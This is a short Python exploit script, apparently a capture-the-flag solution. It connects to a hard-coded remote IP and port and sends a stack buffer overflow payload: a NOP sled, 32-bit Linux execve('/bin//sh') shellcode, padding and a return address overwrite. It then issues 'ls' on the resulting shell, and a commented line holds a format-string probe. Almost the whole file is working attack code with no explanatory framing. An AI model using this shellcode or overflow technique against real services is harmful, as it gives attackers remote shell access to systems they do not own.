import socket
import struct
import re
import time

sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
sc.connect(('23.239.23.84', 9999))

def W(x):
  sc.send(x)

def R():
  return sc.recv(4096)

def PI(x):
  return struct.pack('I', x)

def UI(s):
  return struct.unpack('I', s)[0]



#array[30] = 45 total where 3 are the return address
#45 - 25 - 10 = 10

W("\x90" * 10 + 
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" +
  'A' *  10 +
   "\x2e\x78\x25\x2e" +
  "\n")

#W("%x.%x.%x.%x.%x.%x.%x.%x" + "\n")

print (R())

W("ls" + "\n")
print(R())


#execve(/bin/bash)   \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80

